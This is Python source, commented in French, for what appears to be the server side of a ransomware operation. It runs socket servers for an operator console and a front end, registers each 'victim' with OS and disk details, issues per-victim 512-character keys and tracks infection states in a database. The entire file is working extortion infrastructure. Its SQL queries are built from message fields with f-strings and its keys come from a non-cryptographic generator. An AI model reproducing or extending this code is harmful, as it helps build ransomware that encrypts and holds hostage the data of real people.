from threading import Thread
import queue
import string
import random
import utile.network as network
import utile.message
import utile.data as data
import utile.security as security
import utile.config as config


# Constantes
AES_GCM = True
DEBUG_MODE = True
PORT_SERV_CONSOLE = 8380
PORT_SERV_FRONTAL = 8381

def generate_key(longueur=0, caracteres=string.ascii_letters + string.digits):
    return ''.join(random.choice(caracteres) for i in range(longueur))

def ajout_victim(db, id, os, disk, key):
    # Insérer les données de la victime dans la table 'victims'
    data.insert_data(db, 'victims', '(os, hash, disks, key)', f'("{os}", "{id}", "{disk}", "{key}")')
    # Sélectionner l'ID de la victime en fonction de son hash
    id_victim = data.select_data(db, f'SELECT id_victim FROM victims WHERE hash = "{id}"')[0][0]
    # Insérer l'état INITIALIZE pour la victime dans la table 'states'
    data.insert_data(db, 'states', '(id_victim, state)', f'({id_victim}, "INITIALIZE")')
    # Retourner l'ID de la victime
    return id_victim
def main():
    #Connexion DB + Queue FIFO pour les requetes vers la base de données et les réponses vers frontal/console
    connexion_db = data.connect_db()
    fifo_db = queue.Queue()
    fifo_rep_front = queue.Queue()
    fifo_rep_console = queue.Queue()
    thread_front = Thread(target=thread_frontal, args=(fifo_db, fifo_rep_front), daemon=True).start()
    thread_cons = Thread(target=thread_console, args=(fifo_db, fifo_rep_console), daemon=True).start()
    while True:
        msg = fifo_db.get()
        msg_type = utile.message.get_message_type(msg)
        if msg_type == 'LIST_VICTIM_REQ':
            print("Type du msg : " + str(msg_type))
            list_victim = data.get_list_victims(connexion_db)
            for victim in list_victim:
                msg = utile.message.set_message('list_victim_resp', victim)
                fifo_rep_console.put(msg)
                fifo_rep_console.join() #Fin de boucle on envoit list_victime_end dans la queue fifo de reponse console
            msg = utile.message.set_message('list_victim_end')
            fifo_rep_console.put(msg)
            fifo_rep_console.join()
            fifo_db.task_done()
        if msg_type == 'HISTORY_REQ':
            print("Historique de la victime")
        if msg_type == 'CHANGE_STATE':
            print("Changement d'état")

        if msg_type == 'INITIALIZE_REQ':
            key_victim = generate_key(512)
            id_victim = ajout_victim(connexion_db, msg['INITIALIZE'], msg['OS'], msg['DISKS'], key_victim)
            victim = [id_victim, key_victim, 'INITIALIZE']
            msg = utile.message.set_message('initialize_key', victim)
            fifo_rep_front.put(msg)
            fifo_rep_front.join()
def thread_console(fifo_db, fifo_rep_console):
    server_socket = network.start_net_serv(port=PORT_SERV_CONSOLE)
    while True:
        socket_console, _ = server_socket.accept()
        while True:
            aes_key = security.diffie_hellman_send_key(socket_console)
            message = network.receive_message(socket_console)
            #print("Message crypté : " + str(message))
            message = security.aes_decrypt(message, aes_key)
            print("Message décrypté" + str(message))
            msg_type = utile.message.get_message_type(message)
            print(f"Message du client : {message}")
            print(f"Type : {msg_type}")
            if msg_type == 'LIST_VICTIM_REQ':
                fifo_db.put(message)
                message = fifo_rep_console.get()
                msg_type = utile.message.get_message_type(message)
                while msg_type != 'LIST_VICTIM_END':
                    message = security.aes_encrypt(message, aes_key)
                    network.send_message(socket_console, message)
                    fifo_rep_console.task_done()
                    message = fifo_rep_console.get()
                    msg_type = utile.message.get_message_type(message)
                # Envoi du message list_victime_end
                message = security.aes_encrypt(message, aes_key)
                network.send_message(socket_console, message)
                fifo_rep_console.task_done()

def thread_frontal(fifo_db, fifo_rep_front):
    s_serveur = network.start_net_serv(port=PORT_SERV_FRONTAL)
    while True:
        socket_front, _ = s_serveur.accept()
        aes_key = security.diffie_hellman_send_key(socket_front)
        print("Clé : " + str(aes_key))
        while True:
            msg = network.receive_message(socket_front)
            msg = security.aes_decrypt(msg, aes_key)
            msg_type = utile.message.get_message_type(msg)
            if msg_type == 'INITIALIZE_REQ':
                fifo_db.put(msg)
                msg = fifo_rep_front.get()
                msg_type = utile.message.get_message_type(msg)
                if msg_type == 'INITIALIZE_KEY':
                    msg = security.aes_encrypt(msg, aes_key)
                    network.send_message(socket_front, msg)
                    fifo_rep_front.task_done()


if __name__ == '__main__':
    main()
